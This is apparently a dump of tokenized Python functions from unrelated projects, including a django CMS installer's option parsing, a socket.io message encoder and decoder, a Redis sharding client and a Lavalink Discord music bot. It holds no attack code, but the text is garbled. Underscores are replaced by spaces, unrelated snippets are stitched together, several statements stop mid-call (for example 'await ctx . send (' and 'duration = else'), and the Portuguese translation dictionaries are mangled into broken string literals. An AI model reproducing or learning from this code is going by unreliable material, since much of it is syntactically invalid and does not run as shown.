Europe/Rome' ) parser . add argument ( '--reversion' , '-e' , dest = 'reversion' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'yes' , help = 'Install and configure reversion support ' '(only for django CMS 3.2 and 3.3)' ) parser . add argument ( '--permissions' , dest = 'permissions' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Activate CMS permission management' ) parser . add argument ( '--pip-options' , help = 'pass custom pip options' , default = '' ) parser . add argument ( '--languages' , '-l' , dest = 'languages' , action = 'append' , help = 'Languages to enable. Option can be provided multiple times, or as a ' 'comma separated list. Only language codes supported by Django can ' 'be used here. Example: en, fr-FR, it-IT' ) parser . add argument ( '--django-version' , dest = 'django version' , action = 'store' , choices = data . DJANGO SUPPORTED , default = data . DJANGO DEFAULT , help = 'Django version' ) parser . add argument ( '--cms-version' , '-v' , dest = 'cms version' , action = 'store' , choices = data . DJANGOCMS SUPPORTED , default = data . DJANGOCMS DEFAULT , help = 'django CMS version' ) parser . add argument ( '--parent-dir' , '-p' , dest = 'project directory' , default = '' , action = 'store' , help = 'Optional project parent directory' ) parser . add argument ( '--bootstrap' , dest = 'bootstrap' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Use Twitter Bootstrap Theme' ) parser . add argument ( '--templates' , dest = 'templates' , action = 'store' , default = 'no' , help = 'Use custom template set' ) parser . add argument ( '--starting-page' , dest = 'starting page' , action = 'store' , choices = ( 'yes' , 'no' ) , default = 'no' , help = 'Load a starting page with examples after installation ' '(english language only). Choose "no" if you use a ' 'custom template set.' ) parser . add argument ( dest = 'project name' , action = 'store' , help = 'Name of the project to be created' ) # Command that lists the supported plugins in verbose description parser . add argument ( '--list-plugins' , '-P' , dest = 'plugins' , action = 'store true' , help = 'List plugins that\'s going to be installed and configured' ) # Command that lists the supported plugins in verbose description parser . add argument ( '--dump-requirements' , '-R' , dest = 'dump reqs' , action = 'store true' , help = 'It dumps the requirements that would be installed according to ' 'parameters given. Together with --requirements argument is useful ' 'for customizing the virtualenv' ) # Advanced options. These have a predefined default and are not asked # by config wizard. parser . add argument ( '--no-input' , '-q' , dest = 'noinput' , action = 'store true' , default = True , help = 'Don\'t run the configuration wizard, just use the ' 'provided values' ) parser . add argument ( '--wizard' , '-w' , dest = 'wizard' , action = 'store true' , default = False , help = 'Run the configuration wizard' ) parser . add argument ( '--verbose' , dest = 'verbose' , action = 'store true' , default = False , help = 'Be more verbose and don\'t swallow subcommands output' ) parser . add argument ( '--filer' , '-f' , dest = 'filer' , action = 'store true' , default = True , help = 'Install and configure django-filer plugins ' '- Always enabled' ) parser . add argument ( '--requirements' , '-r' , dest = 'requirements file' , action = 'store' , default = None , help = 'Externally defined requirements file' ) parser . add argument ( '--no-deps' , '-n' , dest = 'no deps' , action = 'store true' , default = False , help = 'Don\'t install package dependencies' ) parser . add argument ( '--no-plugins' , dest = 'no plugins' , action = 'store true' , default = False , help = 'Don\'t install plugins' ) parser . add argument ( '--no-db-driver' , dest = 'no db driver' , action = 'store true' , default = False , help = 'Don\'t install database package' ) parser . add argument ( '--no-sync' , '-m' , dest = 'no sync' , action = 'store true' , default = False , help = 'Don\'t run syncdb / migrate after bootstrapping' ) parser . add argument ( '--no-user' , '-u' , dest = 'no user' , action = 'store true' , default = False , help = 'Don\'t create the admin user' ) parser . add argument ( '--template' , dest = 'template' , action = 'store' , default = None , help = 'The path or URL to load the django project ' 'template from.' ) parser . add argument ( '--extra-settings' , dest = 'extra settings' , action = 'store' , default = None , help = 'The path to an file that contains extra settings.' ) parser . add argument ( '--skip-empty-check' , '-s' , dest = 'skip project dir check' , action = 'store true' , default = False , help = 'Skip the check if project dir is empty.' ) parser . add argument ( '--delete-project-dir' , '-c' , dest = 'delete project dir' , action = 'store true' , default = False , help = 'Delete project directory on creation failure.' ) parser . add argument ( '--utc' , dest = 'utc' , action = 'store true' , default = False , help = 'Use UTC timezone.' ) if '--utc' in args : for action in parser . positionals . actions : if action . dest == 'timezone' : action . default = 'UTC' # If config args then pretend that config args came from the stdin and run parser again. config args = ini . parse config file ( parser , args ) args = parser . parse args ( config args + args ) if not args . wizard : args . noinput = True else : args . noinput = False if not args . project directory : args . project directory = args . project name args . project directory = os . path . abspath ( args . project directory ) # First of all, check if the project name is valid if not validate project ( args . project name ) : sys . stderr . write ( 'Project name "{0}" is not a valid app name, or it\'s already defined. ' 'Please use only numbers, letters and underscores.\n' . format ( args . project name ) ) sys . exit ( 3 ) # Checking the given path setattr ( args , 'project path' , os . path . join ( args . project directory , args . project name ) . strip ( ) ) if not args . skip project dir check : if ( os . path . exists ( args . project directory ) and [ path for path in os . listdir ( args . project directory ) if not path . startswith ( '.' ) ] ) : sys . stderr . write ( 'Path "{0}" already exists and is not empty, please choose a different one\n' 'If you want to use this path anyway use the -s flag to skip this check.\n' '' . format ( args . project directory ) ) sys . exit ( 4 ) if os . path . exists ( args . project path ) : sys . stderr . write ( 'Path "{0}" already exists, please choose a different one\n' . format ( args . project path ) ) sys . exit ( 4 ) if args . config dump and os . path . isfile ( args . config dump ) : sys . stdout . write ( 'Cannot dump because given configuration file "{0}" exists.\n' . format ( args . config dump ) ) sys . exit ( 8 ) args = manage args ( parser , args ) # what do we want here?! # * if languages are given as multiple arguments, let's use it as is # * if no languages are given, use a default and stop handling it further # * if languages are given as a comma-separated list, split it and use the #   resulting list. if not args . languages : try : args . languages = [ locale . getdefaultlocale ( ) [ 0 ] . split ( ' ' ) [ 0 ] ] except Exception : # pragma: no cover args . languages = [ 'en' ] elif isinstance ( args . languages , six . string types ) : args . languages = args . languages . split ( ',' ) elif len ( args . languages ) == 1 and isinstance ( args . languages [ 0 ] , six . string types ) : args . languages = args . languages [ 0 ] . split ( ',' ) args . languages = [ lang . strip ( ) . lower ( ) for lang in args . languages ] if len ( args . languages ) > 1 : args . i18n = 'yes' args . aldryn = False args . filer = True # Convert version to numeric format for easier checking try : django version , cms version = supported versions ( args . django version , args . cms version ) cms package = data . PACKAGE MATRIX . get ( cms version , data . PACKAGE MATRIX [ data . DJANGOCMS LTS ] ) except Runtime Error as e : # pragma: no cover sys . stderr . write ( compat . unicode ( e ) ) sys . exit ( 6 ) if django version is None : # pragma: no cover sys . stderr . write ( 'Please provide a Django supported version: {0}. Only Major.Minor ' 'version selector is accepted\n' . format ( ', ' . join ( data . DJANGO SUPPORTED ) ) ) sys . exit ( 6 ) if cms version is None : # pragma: no cover sys . stderr . write ( 'Please provide a django CMS supported version: {0}. Only Major.Minor ' 'version selector is accepted\n' . format ( ', ' . join ( data . DJANGOCMS SUPPORTED ) ) ) sys . exit ( 6 ) default settings = '{}.settings' . format ( args . project name ) env settings = os . environ . get ( 'DJANGO SETTINGS MODULE' , default settings ) if env settings != default settings : sys . stderr . write ( '`DJANGO SETTINGS MODULE` is currently set to \'{0}\' which is not compatible with ' 'djangocms installer.\n Please unset `DJANGO SETTINGS MODULE` and re-run the installer ' '\n' . format ( env settings ) ) sys . exit ( 10 ) if not getattr ( args , 'requirements file' ) : requirements = [ ] # django CMS version check if args . cms version == 'develop' : requirements . append ( cms package ) warnings . warn ( data . VERSION WARNING . format ( 'develop' , 'django CMS' ) ) elif args . cms version == 'rc' : # pragma: no cover requirements . append ( cms package ) elif args . cms version == 'beta' : # pragma: no cover requirements . append ( cms package ) warnings . warn ( data . VERSION WARNING . format ( 'beta' , 'django CMS' ) ) else : requirements . append ( cms package ) if args . cms version in ( 'rc' , 'develop' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-master' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.6' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.6' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.5' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.5' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.4' ) : requirements . extend ( data . REQUIREMENTS [ 'cms-3.4' ] ) if not args . no db driver : requirements . append ( args . db driver ) if not args . no plugins : if args . cms version in ( 'rc' , 'develop' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-master' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.6' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.6' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.5' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.5' ] ) elif Loose Version ( cms version ) >= Loose Version ( '3.4' ) : requirements . extend ( data . REQUIREMENTS [ 'plugins-3.4' ] ) requirements . extend ( data . REQUIREMENTS [ 'filer' ] ) if args . aldryn : # pragma: no cover requirements . extend ( data . REQUIREMENTS [ 'aldryn' ] ) # Django version check if args . django version == 'develop' : # pragma: no cover requirements . append ( data . DJANGO DEVELOP ) warnings . warn ( data . VERSION WARNING . format ( 'develop' , 'Django' ) ) elif args . django version == 'beta' : # pragma: no cover requirements . append ( data . DJANGO BETA ) warnings . warn ( data . VERSION WARNING . format ( 'beta' , 'Django' ) ) else : requirements . append ( 'Django<{0}' . format ( less than version ( django version ) ) ) if django version == '1.8' : requirements . extend ( data . REQUIREMENTS [ 'django-1.8' ] ) elif django version == '1.9' : requirements . extend ( data . REQUIREMENTS [ 'django-1.9' ] ) elif django version == '1.10' : requirements . extend ( data . REQUIREMENTS [ 'django-1.10' ] ) elif django version == '1.11' : requirements . extend ( data . REQUIREMENTS [ 'django-1.11' ] ) elif django version == '2.0' : requirements . extend ( data . REQUIREMENTS [ 'django-2.0' ] ) elif django version == '2.1' : requirements . extend ( data . REQUIREMENTS [ 'django-2.1' ] ) requirements . extend ( data . REQUIREMENTS [ 'default' ] ) setattr ( args , 'requirements' , '\n' . join ( requirements ) . strip ( ) ) # Convenient shortcuts setattr ( args , 'cms version' , cms version ) setattr ( args , 'django version' , django version ) setattr ( args , 'settings path' , os . path . join ( args . project directory , args . project name , 'settings.py' ) . strip ( ) ) setattr ( args , 'urlconf path' , os . path . join ( args . project directory , args . project name , 'urls.py' ) . strip ( ) ) if args . config dump : ini . dump config file ( args . config dump , args , parser ) return args
def manage args ( parser , args ) : for item in data . CONFIGURABLE OPTIONS : action = parser . option string actions [ item ] choices = default = '' input value = getattr ( args , action . dest ) new val = None # cannot count this until we find a way to test input if not args . noinput : # pragma: no cover if action . choices : choices = ' (choices: {0})' . format ( ', ' . join ( action . choices ) ) if input value : if type ( input value ) == list : default = ' [default {0}]' . format ( ', ' . join ( input value ) ) else : default = ' [default {0}]' . format ( input value ) while not new val : prompt = '{0}{1}{2}: ' . format ( action . help , choices , default ) if action . choices in ( 'yes' , 'no' ) : new val = utils . query yes no ( prompt ) else : new val = compat . input ( prompt ) new val = compat . clean ( new val ) if not new val and input value : new val = input value if new val and action . dest == 'templates' : if new val != 'no' and not os . path . isdir ( new val ) : sys . stdout . write ( 'Given directory does not exists, retry\n' ) new val = False if new val and action . dest == 'db' : action ( parser , args , new val , action . option strings ) new val = getattr ( args , action . dest ) else : if not input value and action . required : raise Value Error ( 'Option {0} is required when in no-input mode' . format ( action . dest ) ) new val = input value if action . dest == 'db' : action ( parser , args , new val , action . option strings ) new val = getattr ( args , action . dest ) if action . dest == 'templates' and ( new val == 'no' or not os . path . isdir ( new val ) ) : new val = False if action . dest in ( 'bootstrap' , 'starting page' ) : new val = ( new val == 'yes' ) setattr ( args , action . dest , new val ) return args
def supported versions ( django , cms ) : cms version = None django version = None try : cms version = Decimal ( cms ) except ( Value Error , Invalid Operation ) : try : cms version = CMS VERSION MATRIX [ str ( cms ) ] except Key Error : pass try : django version = Decimal ( django ) except ( Value Error , Invalid Operation ) : try : django version = DJANGO VERSION MATRIX [ str ( django ) ] except Key Error : # pragma: no cover pass try : if ( cms version and django version and not ( Loose Version ( VERSION MATRIX [ compat . unicode ( cms version ) ] [ 0 ] ) <= Loose Version ( compat . unicode ( django version ) ) <= Loose Version ( VERSION MATRIX [ compat . unicode ( cms version ) ] [ 1 ] ) ) ) : raise Runtime Error ( 'Django and django CMS versions doesn\'t match: ' 'Django {0} is not supported by django CMS {1}' . format ( django version , cms version ) ) except Key Error : raise Runtime Error ( 'Django and django CMS versions doesn\'t match: ' 'Django {0} is not supported by django CMS {1}' . format ( django version , cms version ) ) return ( compat . unicode ( django version ) if django version else django version , compat . unicode ( cms version ) if cms version else cms version )
def dump config file ( filename , args , parser = None ) : config = Config Parser ( ) config . add section ( SECTION ) if parser is None : for attr in args : config . set ( SECTION , attr , args . attr ) else : keys empty values not pass = ( '--extra-settings' , '--languages' , '--requirements' , '--template' , '--timezone' ) # positionals. option string actions for action in parser . actions : if action . dest in ( 'help' , 'config file' , 'config dump' , 'project name' ) : continue keyp = action . option strings [ 0 ] option name = keyp . lstrip ( '-' ) option value = getattr ( args , action . dest ) if any ( [ i for i in keys empty values not pass if i in action . option strings ] ) : if action . dest == 'languages' : if len ( option value ) == 1 and option value [ 0 ] == 'en' : config . set ( SECTION , option name , '' ) else : config . set ( SECTION , option name , ',' . join ( option value ) ) else : config . set ( SECTION , option name , option value if option value else '' ) elif action . choices == ( 'yes' , 'no' ) : config . set ( SECTION , option name , 'yes' if option value else 'no' ) elif action . dest == 'templates' : config . set ( SECTION , option name , option value if option value else 'no' ) elif action . dest == 'cms version' : version = ( 'stable' if option value == CMS VERSION MATRIX [ 'stable' ] else option value ) config . set ( SECTION , option name , version ) elif action . dest == 'django version' : version = ( 'stable' if option value == DJANGO VERSION MATRIX [ 'stable' ] else option value ) config . set ( SECTION , option name , version ) elif action . const : config . set ( SECTION , option name , 'true' if option value else 'false' ) else : config . set ( SECTION , option name , str ( option value ) ) with open ( filename , 'w' ) as fp : config . write ( fp )
def validate sample rates ( input filepath list , combine type ) : sample rates = [ file info . sample rate ( f ) for f in input filepath list ] if not core . all equal ( sample rates ) : raise IO Error ( "Input files do not have the same sample rate. The {} combine " "type requires that all files have the same sample rate" . format ( combine type ) )
def validate num channels ( input filepath list , combine type ) : channels = [ file info . channels ( f ) for f in input filepath list ] if not core . all equal ( channels ) : raise IO Error ( "Input files do not have the same number of channels. The " "{} combine type requires that all files have the same " "number of channels" . format ( combine type ) )
def reverse ( self ) : effect args = [ 'reverse' ] self . effects . extend ( effect args ) self . effects log . append ( 'reverse' ) return self
def join ( self , room ) : self . socket . rooms . add ( self . get room name ( room ) )
def leave ( self , room ) : self . socket . rooms . remove ( self . get room name ( room ) )
def save ack callback ( self , msgid , callback ) : if msgid in self . ack callbacks : return False self . ack callbacks [ msgid ] = callback
def heartbeat ( self ) : interval = self . config [ 'heartbeat interval' ] while self . connected : gevent . sleep ( interval ) # TODO: this process could use a timeout object like the disconnect #       timeout thing, and ONLY send packets when none are sent! #       We would do that by calling timeout.set() for a "sending" #       timeout.  If we're sending 100 messages a second, there is #       no need to push some heartbeats in there also. self . put client msg ( "2::" )
def spawn heartbeat ( self ) : self . spawn ( self . heartbeat ) self . spawn ( self . heartbeat timeout )
def encode ( data , json dumps = default json dumps ) : payload = '' msg = str ( MSG TYPES [ data [ 'type' ] ] ) if msg in [ '0' , '1' ] : # '1::' [path] [query] msg += '::' + data [ 'endpoint' ] if 'qs' in data and data [ 'qs' ] != '' : msg += ':' + data [ 'qs' ] elif msg == '2' : # heartbeat msg += '::' elif msg in [ '3' , '4' , '5' ] : # '3:' [id ('+')] ':' [endpoint] ':' [data] # '4:' [id ('+')] ':' [endpoint] ':' [json] # '5:' [id ('+')] ':' [endpoint] ':' [json encoded event] # The message id is an incremental integer, required for AC Ks. # If the message id is followed by a +, the ACK is not handled by # socket.io, but by the user instead. if msg == '3' : payload = data [ 'data' ] if msg == '4' : payload = json dumps ( data [ 'data' ] ) if msg == '5' : d = { } d [ 'name' ] = data [ 'name' ] if 'args' in data and data [ 'args' ] != [ ] : d [ 'args' ] = data [ 'args' ] payload = json dumps ( d ) if 'id' in data : msg += ':' + str ( data [ 'id' ] ) if data [ 'ack' ] == 'data' : msg += '+' msg += ':' else : msg += '::' if 'endpoint' not in data : data [ 'endpoint' ] = '' if payload != '' : msg += data [ 'endpoint' ] + ':' + payload else : msg += data [ 'endpoint' ] elif msg == '6' : # '6:::' [id] '+' [data] msg += '::' + data . get ( 'endpoint' , '' ) + ':' + str ( data [ 'ack Id' ] ) if 'args' in data and data [ 'args' ] != [ ] : msg += '+' + json dumps ( data [ 'args' ] ) elif msg == '7' : # '7::' [endpoint] ':' [reason] '+' [advice] msg += ':::' if 'reason' in data and data [ 'reason' ] != '' : msg += str ( ERROR REASONS [ data [ 'reason' ] ] ) if 'advice' in data and data [ 'advice' ] != '' : msg += '+' + str ( ERROR ADVICES [ data [ 'advice' ] ] ) msg += data [ 'endpoint' ] # No Op, used to close a poll after the polling duration time elif msg == '8' : msg += '::' return msg
def decode ( rawstr , json loads = default json loads ) : decoded msg = { } try : # Handle decoding in Python<3. rawstr = rawstr . decode ( 'utf-8' ) except Attribute Error : pass split data = rawstr . split ( ":" , 3 ) msg type = split data [ 0 ] msg id = split data [ 1 ] endpoint = split data [ 2 ] data = '' if msg id != '' : if "+" in msg id : msg id = msg id . split ( '+' ) [ 0 ] decoded msg [ 'id' ] = int ( msg id ) decoded msg [ 'ack' ] = 'data' else : decoded msg [ 'id' ] = int ( msg id ) decoded msg [ 'ack' ] = True # common to every message msg type id = int ( msg type ) if msg type id in MSG VALUES : decoded msg [ 'type' ] = MSG VALUES [ int ( msg type ) ] else : raise Exception ( "Unknown message type: %s" % msg type ) decoded msg [ 'endpoint' ] = endpoint if len ( split data ) > 3 : data = split data [ 3 ] if msg type == "0" : # disconnect pass elif msg type == "1" : # connect decoded msg [ 'qs' ] = data elif msg type == "2" : # heartbeat pass elif msg type == "3" : # message decoded msg [ 'data' ] = data elif msg type == "4" : # json msg decoded msg [ 'data' ] = json loads ( data ) elif msg type == "5" : # event try : data = json loads ( data ) except Value Error : print ( "Invalid JSON event message" , data ) decoded msg [ 'args' ] = [ ] else : decoded msg [ 'name' ] = data . pop ( 'name' ) if 'args' in data : decoded msg [ 'args' ] = data [ 'args' ] else : decoded msg [ 'args' ] = [ ] elif msg type == "6" : # ack if '+' in data : ack Id , data = data . split ( '+' ) decoded msg [ 'ack Id' ] = int ( ack Id ) decoded msg [ 'args' ] = json loads ( data ) else : decoded msg [ 'ack Id' ] = int ( data ) decoded msg [ 'args' ] = [ ] elif msg type == "7" : # error if '+' in data : reason , advice = data . split ( '+' ) decoded msg [ 'reason' ] = REASONS VALUES [ int ( reason ) ] decoded msg [ 'advice' ] = ADVICES VALUES [ int ( advice ) ] else : decoded msg [ 'advice' ] = '' if data != '' : decoded msg [ 'reason' ] = REASONS VALUES [ int ( data ) ] else : decoded msg [ 'reason' ] = '' elif msg type == "8" : # noop pass return decoded msg
def get socket ( self , sessid = '' ) : socket = self . sockets . get ( sessid ) if sessid and not socket : return None # you ask for a session that doesn't exist! if socket is None : socket = Socket ( self , self . config ) self . sockets [ socket . sessid ] = socket else : socket . incr hits ( ) return socket
def write ( self , data ) : args = parse qs ( self . handler . environ . get ( "QUERY STRING" ) ) if "i" in args : i = args [ "i" ] else : i = "0" # TODO: don't we need to quote this data in here ? super ( JSON Polling , self ) . write ( "io.j[%s]('%s');" % ( i , data ) )
def remove binaries ( ) : patterns = ( "adslib/*.a" , "adslib/*.o" , "adslib/obj/*.o" , "adslib/*.bin" , "adslib/*.so" , ) for f in functools . reduce ( operator . iconcat , [ glob . glob ( p ) for p in patterns ] ) : os . remove ( f )
def ads Port Close Ex ( port ) : # type: (int) -> None port close ex = ads DLL . Ads Port Close Ex port close ex . restype = ctypes . c long error code = port close ex ( port ) if error code : raise ADS Error ( error code )
def open ( self ) : if self . open : return self . port = ads Port Open Ex ( ) if linux : ads Add Route ( self . adr . net Id Struct ( ) , self . ip address ) self . open = True
def fetch ( self , start date , end date ) : records = [ ] for two months range in self . generate ranges ( start date , end date ) : log . debug ( two months range ) for record in self . fetch missions for range ( two months range [ 0 ] , two months range [ 1 ] ) : records . append ( record ) df = pd . Data Frame ( records , columns = [ 'participant' , 'destination' , 'subject' , 'start' , 'end' , 'canceled' , 'report status' , 'report details link' ] ) translate column ( df , 'report status' , { 'Disponvel':   Available', 'Pendente' : 'Pending' , 'Em anlise':   Analysing', 'No se aplica':   Does not apply' } ) translate column ( df , 'canceled' , { 'No':   No', 'Sim' : 'Yes' } ) return df . drop duplicates ( )
def fetch ( self ) : xml = urllib . request . urlopen ( self . URL ) tree = ET . Element Tree ( file = xml ) records = self . parse deputies ( tree . getroot ( ) ) df = pd . Data Frame ( records , columns = ( 'congressperson id' , 'budget id' , 'condition' , 'congressperson document' , 'civil name' , 'congressperson name' , 'picture url' , 'gender' , 'state' , 'party' , 'phone number' , 'email' ) ) return self . translate ( df )
def remove node ( self , node ) : self . nodes . remove ( node ) for x in xrange ( self . replicas ) : ring key = self . hash method ( b ( "%s:%d" % ( node , x ) ) ) self . ring . pop ( ring key ) self . sorted keys . remove ( ring key )
def iter nodes ( self , key ) : if len ( self . ring ) == 0 : yield None , None node , pos = self . get node pos ( key ) for k in self . sorted keys [ pos : ] : yield k , self . ring [ k ]
def mget ( self , keys , * args ) : args = list or args ( keys , args ) server keys = { } ret dict = { } for key in args : server name = self . get server name ( key ) server keys [ server name ] = server keys . get ( server name , [ ] ) server keys [ server name ] . append ( key ) for server name , sub keys in iteritems ( server keys ) : values = self . connections [ server name ] . mget ( sub keys ) ret dict . update ( dict ( zip ( sub keys , values ) ) ) result = [ ] for key in args : result . append ( ret dict . get ( key , None ) ) return result
def mset ( self , mapping ) : servers = { } for key , value in mapping . items ( ) : server name = self . get server name ( key ) servers . setdefault ( server name , [ ] ) servers [ server name ] . append ( ( key , value ) ) for name , items in servers . items ( ) : self . connections [ name ] . mset ( dict ( items ) ) return True
async def connect ( self ) : await self . lavalink . bot . wait until ready ( ) if self . ws and self . ws . open : log . debug ( 'Web Socket still open, closing...' ) await self . ws . close ( ) user id = self . lavalink . bot . user . id shard count = self . lavalink . bot . shard count or self . shards headers = { 'Authorization' : self . password , 'Num-Shards' : shard count , 'User-Id' : str ( user id ) } log . debug ( 'Preparing to connect to Lavalink' ) log . debug ( '    with URI: {}' . format ( self . uri ) ) log . debug ( '    with headers: {}' . format ( str ( headers ) ) ) log . info ( 'Connecting to Lavalink...' ) try : self . ws = await websockets . connect ( self . uri , loop = self . loop , extra headers = headers ) except OS Error as error : log . exception ( 'Failed to connect to Lavalink: {}' . format ( str ( error ) ) ) else : log . info ( 'Connected to Lavalink!' ) self . loop . create task ( self . listen ( ) ) version = self . ws . response headers . get ( 'Lavalink-Major-Version' , 2 ) try : self . lavalink . server version = int ( version ) except Value Error : self . lavalink . server version = 2 log . info ( 'Lavalink server version is {}' . format ( version ) ) if self . queue : log . info ( 'Replaying {} queued events...' . format ( len ( self . queue ) ) ) for task in self . queue : await self . send ( * * task )
async def listen ( self ) : while not self . shutdown : try : data = json . loads ( await self . ws . recv ( ) ) except websockets . Connection Closed as error : log . warning ( 'Disconnected from Lavalink: {}' . format ( str ( error ) ) ) for g in self . lavalink . players . players . copy ( ) . keys ( ) : ws = self . lavalink . bot . connection . get websocket ( int ( g ) ) await ws . voice state ( int ( g ) , None ) self . lavalink . players . clear ( ) if self . shutdown : break if await self . attempt reconnect ( ) : return log . warning ( 'Unable to reconnect to Lavalink!' ) break op = data . get ( 'op' , None ) log . debug ( 'Received Web Socket data {}' . format ( str ( data ) ) ) if not op : return log . debug ( 'Received Web Socket message without op {}' . format ( str ( data ) ) ) if op == 'event' : log . debug ( 'Received event of type {}' . format ( data [ 'type' ] ) ) player = self . lavalink . players [ int ( data [ 'guild Id' ] ) ] event = None if data [ 'type' ] == 'Track End Event' : event = Track End Event ( player , data [ 'track' ] , data [ 'reason' ] ) elif data [ 'type' ] == 'Track Exception Event' : event = Track Exception Event ( player , data [ 'track' ] , data [ 'error' ] ) elif data [ 'type' ] == 'Track Stuck Event' : event = Track Stuck Event ( player , data [ 'track' ] , data [ 'threshold Ms' ] ) if event : await self . lavalink . dispatch event ( event ) elif op == 'player Update' : await self . lavalink . update state ( data ) elif op == 'stats' : self . lavalink . stats . update ( data ) await self . lavalink . dispatch event ( Stats Update Event ( self . lavalink . stats ) ) log . debug ( 'Closing Web Socket...' ) await self . ws . close ( )
def connected channel ( self ) : if not self . channel id : return None return self . lavalink . bot . get channel ( int ( self . channel id ) )
async def connect ( self , channel id : int ) : ws = self . lavalink . bot . connection . get websocket ( int ( self . guild id ) ) await ws . voice state ( self . guild id , str ( channel id ) )
async def disconnect ( self ) : if not self . is connected : return await self . stop ( ) ws = self . lavalink . bot . connection . get websocket ( int ( self . guild id ) ) await ws . voice state ( self . guild id , None )
def store ( self , key : object , value : object ) : self . user data . update ( { key : value } )
def fetch ( self , key : object , default = None ) : return self . user data . get ( key , default )
def add ( self , requester : int , track : dict ) : self . queue . append ( Audio Track ( ) . build ( track , requester ) )
def add next ( self , requester : int , track : dict ) : self . queue . insert ( 0 , Audio Track ( ) . build ( track , requester ) )
def add at ( self , index : int , requester : int , track : dict ) : self . queue . insert ( min ( index , len ( self . queue ) - 1 ) , Audio Track ( ) . build ( track , requester ) )
async def play ( self , track index : int = 0 , ignore shuffle : bool = False ) : if self . repeat and self . current : self . queue . append ( self . current ) self . previous = self . current self . current = None self . position = 0 self . paused = False if not self . queue : await self . stop ( ) await self . lavalink . dispatch event ( Queue End Event ( self ) ) else : if self . shuffle and not ignore shuffle : track = self . queue . pop ( randrange ( len ( self . queue ) ) ) else : track = self . queue . pop ( min ( track index , len ( self . queue ) - 1 ) ) self . current = track await self . lavalink . ws . send ( op = 'play' , guild Id = self . guild id , track = track . track ) await self . lavalink . dispatch event ( Track Start Event ( self , track ) )
async def play now ( self , requester : int , track : dict ) : self . add next ( requester , track ) await self . play ( ignore shuffle = True )
async def play at ( self , index : int ) : self . queue = self . queue [ min ( index , len ( self . queue ) - 1 ) : len ( self . queue ) ] await self . play ( ignore shuffle = True )
async def play previous ( self ) : if not self . previous : raise No Previous Track self . queue . insert ( 0 , self . previous ) await self . play ( ignore shuffle = True )
async def stop ( self ) : await self . lavalink . ws . send ( op = 'stop' , guild Id = self . guild id ) self . current = None
async def set pause ( self , pause : bool ) : await self . lavalink . ws . send ( op = 'pause' , guild Id = self . guild id , pause = pause ) self . paused = pause
async def seek ( self , pos : int ) : await self . lavalink . ws . send ( op = 'seek' , guild Id = self . guild id , position = pos )
async def handle event ( self , event ) : if isinstance ( event , ( Track Stuck Event , Track Exception Event ) ) or isinstance ( event , Track End Event ) and event . reason == 'FINISHED' : await self . play ( )
def get ( self , guild id ) : if guild id not in self . players : p = self . player ( lavalink = self . lavalink , guild id = guild id ) self . players [ guild id ] = p return self . players [ guild id ]
def remove ( self , guild id ) : if guild id in self . players : self . players [ guild id ] . cleanup ( ) del self . players [ guild id ]
async def play ( self , ctx , * , query : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) query = query . strip ( '<>' ) if not url rx . match ( query ) : query = f'ytsearch:{query}' tracks = await self . bot . lavalink . get tracks ( query ) if not tracks : return await ctx . send ( 'Nothing found!' ) embed = discord . Embed ( color = discord . Color . blurple ( ) ) if 'list' in query and 'ytsearch:' not in query : for track in tracks : player . add ( requester = ctx . author . id , track = track ) embed . title = 'Playlist enqueued!' embed . description = f'Imported {len(tracks)} tracks from the playlist!' await ctx . send ( embed = embed ) else : track title = tracks [ 0 ] [ "info" ] [ "title" ] track uri = tracks [ 0 ] [ "info" ] [ "uri" ] embed . title = "Track enqueued!" embed . description = f'[{track title}]({track uri})' player . add ( requester = ctx . author . id , track = tracks [ 0 ] ) if not player . is playing : await player . play ( )
async def seek ( self , ctx , * , time : str ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is playing : return await ctx . send ( 'Not playing.' ) seconds = time rx . search ( time ) if not seconds : return await ctx . send ( 'You need to specify the amount of seconds to skip!' ) seconds = int ( seconds . group ( ) ) * 1000 if time . startswith ( '-' ) : seconds *= - 1 track time = player . position + seconds await player . seek ( track time ) await ctx . send ( f'Moved track to **{lavalink.Utils.format time(track time)}**' )
async def skip ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is playing : return await ctx . send ( 'Not playing.' ) await player . skip ( ) await ctx . send (
async def stop ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . is playing : return await ctx . send ( 'Not playing.' ) player . queue . clear ( ) await player . stop ( ) await ctx . send (
async def now ( self , ctx ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) song = 'Nothing' if player . current : position = lavalink . Utils . format time ( player . position ) if player . current . stream : duration = else : duration = lavalink . Utils . format time ( player . current . duration ) song = f'**[{player.current.title}]({player.current.uri})**\n({position}/{duration})' embed = discord . Embed ( color = discord . Color . blurple ( ) , title = 'Now Playing' , description = song ) await ctx . send ( embed = embed )
async def queue ( self , ctx , page : int = 1 ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not player . queue : return await ctx . send ( 'There\'s nothing in the queue! Why not queue something?' ) items per page = 10 pages = math . ceil ( len ( player . queue ) / items per page ) start = ( page - 1 ) * items per page end = start + items per page queue list = '' for index , track in enumerate ( player . queue [ start : end ] , start = start ) : queue list += f'`{index + 1}.` [**{track.title}**]({track.uri})\n' embed = discord . Embed ( colour = discord . Color . blurple ( ) , description = f'**{len(player.queue)} tracks**\n\n{queue list}' ) embed . set footer ( text = f'Viewing page {page}/{pages}' ) await ctx . send ( embed = embed )
async def volume ( self , ctx , volume : int = None ) : player = self . bot . lavalink . players . get ( ctx . guild . id ) if not volume : return await ctx . send ( await player . set volume ( volume ) await ctx . send (
